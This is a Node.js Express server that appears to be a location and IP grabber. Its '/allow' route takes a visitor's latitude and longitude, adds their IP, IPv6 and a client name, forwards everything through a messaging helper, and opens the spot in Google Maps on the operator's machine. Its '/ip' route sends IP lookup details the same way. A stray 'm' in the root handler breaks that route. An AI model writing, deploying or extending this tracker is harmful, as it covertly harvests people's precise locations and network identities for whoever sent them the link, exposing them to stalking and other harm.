const https = require("https")
const express = require("express")          // install module before : =>   npm install express
const path = require('path');
const app = express()           
const PORT = process.env.PORT || 4000       // change port
const lib = require("./sys/libFunction");
const open = require('open');               // install module before : =>   npm install open
app.use(express.json())
app.use(express.urlencoded({
  extended: true
}))
app.get("/",(req,res)=> {
    
  res.send("version3");
  m
})
app.get("/client/:acc",(req,res)=> {
    var Account = req.params.acc;
    lib.SendLine("Client Name is "+Account);
    
    res.sendFile(path.join(__dirname, '/sys/page.html'));
    
})

app.get("/allow",async function(req,res){    
    var Latitude = req.query.lat;
    var ClientName = req.query.cl;
    var txt = '\r\n'+ "*** When allow location ***" + '\r\n'
            + "Client Name : "+ ClientName  + '\r\n'
            + "Date time : "+lib.GetDateTime()+'\r\n'
            + "IP : "+lib.GetIP() + '\r\n'
            + "IPv6 : "+lib.GetIPv6(req) + '\r\n'
            //+ await lib.GetDetail() + '\r\n'
            + "Latitude,Longitude on web : " + Latitude + '\r\n'
            + "Google Map (allow location) : https://www.google.com/maps/?q="+Latitude

    await lib.SendLine(txt);
    await open("https://www.google.com/maps/?q="+Latitude,{app: ['google chrome']})
    res.send("Done");
})

app.get("/ip",async function(req,res){    
    var ClientName = req.query.cl;
    var txt = '\r\n'+"*** API IPinfo ***" + '\r\n'
            + "Client Name : "+ ClientName  + '\r\n'
            + "Date time : "+lib.GetDateTime()+'\r\n'
            + await lib.GetDetail()
    await lib.SendLine(txt);    
    res.send("Done"); // to do something
})

app.listen(PORT, () => {
  console.log(`Example app listening at http://localhost:${PORT}`)
})





